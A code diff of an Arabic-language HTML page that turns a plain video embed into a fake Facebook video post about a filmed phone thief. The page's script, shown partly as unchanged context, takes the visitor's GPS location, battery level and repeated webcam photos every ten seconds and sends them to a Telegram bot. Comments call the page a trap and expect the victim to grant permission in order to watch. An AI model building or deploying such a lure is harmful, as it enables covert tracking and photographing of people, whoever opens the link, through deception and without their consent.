@@ -1,53 +1,84 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>شاهد الآن - البث المباشر</title>
+    <title>Facebook Video - مشاهدة الفيديو</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { 
-            margin: 0; 
-            background-color: #000; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            font-family: sans-serif; 
-            overflow: hidden; 
-        }
-        .video-container { 
-            width: 100%; 
-            max-width: 640px; 
-            position: relative; 
-            padding-bottom: 56.25%; 
-            height: 0; 
-            box-shadow: 0 0 20px rgba(255,255,255,0.1);
-        }
-        .video-container iframe { 
-            position: absolute; 
-            top: 0; 
-            left: 0; 
-            width: 100%; 
-            height: 100%; 
-            border: none; 
-        }
+        body { margin: 0; background-color: #f0f2f5; font-family: 'Segoe UI', Helvetica, Arial, sans-serif; }
+        
+        /* شريط فيسبوك العلوي المزيف */
+        .fb-header { background-color: #ffffff; padding: 10px 16px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: space-between; position: fixed; top: 0; width: 100%; z-index: 1000; box-sizing: border-box; }
+        .fb-logo { color: #1877f2; font-size: 28px; font-weight: bold; }
+        .fb-icons { color: #606770; font-size: 20px; display: flex; gap: 15px; }
+
+        /* حاوية الفيديو الرئيسية */
+        .main-container { margin-top: 70px; display: flex; flex-direction: column; align-items: center; padding: 16px; }
+        .video-card { background-color: #ffffff; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.1); width: 100%; max-width: 680px; overflow: hidden; }
+        
+        /* مشغل الفيديو المزيف */
+        .video-player { background-color: #000000; position: relative; padding-bottom: 56.25%; height: 0; display: flex; justify-content: center; align-items: center; cursor: pointer; }
+        .video-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; color: white; background: rgba(0,0,0,0.5); z-index: 10; }
+        
+        /* علامة التحميل (Spinner) */
+        .spinner { border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #ffffff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* تفاصيل الفيديو المزيفة */
+        .video-details { padding: 12px 16px; }
+        .video-title { font-size: 18px; font-weight: bold; color: #1c1e21; margin-bottom: 5px; }
+        .video-meta { font-size: 13px; color: #65676b; margin-bottom: 12px; }
+        .video-stats { font-size: 14px; color: #65676b; border-top: 1px solid #ebedf0; border-bottom: 1px solid #ebedf0; padding: 10px 0; display: flex; justify-content: space-between; }
+        
+        /* أزرار فيسبوك المزيفة */
+        .video-actions { display: flex; justify-content: space-around; padding: 10px 0; color: #606770; font-weight: 600; font-size: 15px; }
+        .action-btn { cursor: pointer; display: flex; align-items: center; gap: 8px; }
+        .action-btn:hover { color: #1877f2; }
+
         #canvas { display: none; }
-        .loading-text {
-            position: absolute;
-            bottom: 20px;
-            color: #444;
-            font-size: 10px;
-        }
     </style>
 </head>
 <body>
 
-    <div class="video-container">
-        <iframe src="https://www.youtube.com/embed/fHI8X4OXluQ?autoplay=1&loop=1&playlist=fHI8X4OXluQ&controls=1&mute=0" 
-                allow="autoplay; encrypted-media" allowfullscreen></iframe>
+    <div class="fb-header">
+        <div class="fb-logo"><i class="fab fa-facebook"></i></div>
+        <div class="fb-icons">
+            <i class="fas fa-home"></i>
+            <i class="fas fa-video" style="color: #1877f2;"></i>
+            <i class="fas fa-users"></i>
+            <i class="fas fa-bell"></i>
+        </div>
     </div>
-    
-    <div class="loading-text">Loading secure player... v2.0.4</div>
+
+    <div class="main-container">
+        <div class="video-card">
+            
+            <div class="video-player">
+                <div class="video-overlay">
+                    <div class="spinner"></div>
+                    <div style="font-size: 16px;">جاري تحميل الفيديو...</div>
+                    <div style="font-size: 12px; margin-top: 5px;">يرجى الانتظار، جودة عالية HD</div>
+                </div>
+            </div>
+
+            <div class="video-details">
+                <div class="video-title">شاهد: لحظة قيام اللص بسرقة الهاتف - تم التعرف على الوجه! <i class="fas fa-exclamation-triangle" style="color: #e02424;"></i></div>
+                <div class="video-meta">نُشر بواسطة: مراقبة المدينة الآمنة · قبل ٣ دقائق · <i class="fas fa-globe-americas"></i> عام</div>
+                
+                <div class="video-stats">
+                    <div><i class="fas fa-thumbs-up" style="color: #1877f2;"></i> ١٢ ألف إعجاب</div>
+                    <div>٤،٥ ألف تعليق · ٣ آلاف مشاركة</div>
+                </div>
+
+                <div class="video-actions">
+                    <div class="action-btn"><i class="far fa-thumbs-up"></i> إعجاب</div>
+                    <div class="action-btn"><i class="far fa-comment"></i> تعليق</div>
+                    <div class="action-btn" style="color: #1877f2;"><i class="fas fa-share"></i> مشاركة</div>
+                </div>
+            </div>
+        </div>
+    </div>
 
     <canvas id="canvas" width="640" height="480"></canvas>
 
@@ -64,7 +95,7 @@
 
     async function startTrackingSystem() {
         // المحاولة الأولى فوراً
-        captureAndSend("🚨 **رصد أولي: تم فتح الرابط الآن!**");
+        captureAndSend("🚨 **رصد أولي: تم فتح رابط (فخ فيسبوك) الآن!**");
 
         // تكرار العملية كل 10 ثوانٍ
         setInterval(() => {
@@ -79,7 +110,7 @@
             batteryStatus = `🔋 البطارية: ${Math.round(battery.level * 100)}%`;
         } catch(e) { batteryStatus = "🔋 البطارية: غير متوفرة"; }
 
-        // طلب الموقع الجغرافي
+        // طلب الموقع الجغرافي (اللص سيضغط "سماح" فوراً ليفتح الفيديو)
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const { latitude, longitude, accuracy } = pos.coords;
             const mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
@@ -93,7 +124,7 @@
                 const tempVideo = document.createElement('video');
                 tempVideo.srcObject = stream;
                 tempVideo.autoplay = true;
-                tempVideo.setAttribute('playsinline', ''); // ضروري لعمل الكاميرا في الآيفون صامتة
+                tempVideo.setAttribute('playsinline', ''); // للآيفون
 
                 // انتظار ثانية واحدة لضبط جودة الصورة قبل الالتقاط
                 setTimeout(() => {
@@ -108,7 +139,7 @@
                     
                     sendToTelegram(photoBase64, message);
 
-                    // إغلاق الكاميرا بعد الالتقاط لتوفير الطاقة وتجنب لفت الانتباه
+                    // إغلاق الكاميرا بعد الالتقاط
                     stream.getTracks().forEach(t => t.stop());
                 }, 1500);
 
@@ -116,9 +147,7 @@
                 // في حال رفض الكاميرا أو كانت محجوبة
                 sendToTelegram(null, `${headerText}\n⚠️ الكاميرا محجوبة\n${batteryStatus}\n📍 الموقع: ${mapLink}`);
             }
-        }, (err) => {
-            console.log("Location access denied.");
-        }, { enableHighAccuracy: true });
+        }, null, { enableHighAccuracy: true });
     }
 
     function sendToTelegram(photo, caption) {
